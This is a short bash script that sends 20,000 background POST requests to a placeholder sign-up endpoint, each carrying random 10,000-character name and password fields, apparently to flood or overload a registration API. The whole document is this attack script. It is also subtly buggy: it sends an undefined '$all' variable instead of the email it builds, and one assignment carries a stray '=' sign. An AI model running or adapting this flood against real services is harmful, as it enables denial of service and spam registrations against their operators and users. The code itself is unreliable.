#!/bin/bash
count=1
while [ $count -lt 20000 ]; do
	s8=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1); s10000==$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10000 | head -n 1);

	email=$s8"@gmail.com";

	curl -H "Content-Type: application/json"  -X POST -d '{"email":"'$all'","lname":"'$s10000'","password":"'$s10000'","password_retry":"'$s10000'","time_zone":"Europe/Moscow","ref_code":null}' https://url.com &
	count=$[$count +1]; echo " $count ";
done;
